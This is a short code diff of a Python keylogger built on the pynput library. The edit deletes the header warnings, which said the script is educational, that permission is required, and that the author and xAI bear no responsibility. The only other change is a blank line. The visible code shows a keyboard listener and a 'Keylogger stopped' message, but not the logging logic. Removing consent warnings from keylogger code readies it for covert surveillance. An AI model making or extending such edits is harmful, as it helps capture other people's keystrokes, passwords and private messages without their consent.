@@ -1,8 +1,3 @@
-# WARNING: This is a basic keylogger script for educational purposes only.
-# Keyloggers can be used maliciously and may violate privacy laws.
-# Always obtain explicit permission from the user before running this on any device.
-# Use responsibly and ethically. The author and xAI are not responsible for any misuse.
-
 # To run this script, you need to install the pynput library:
 # pip install pynput
 
@@ -59,4 +54,5 @@ if __name__ == "__main__":
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
     
+
     print("Keylogger stopped.")
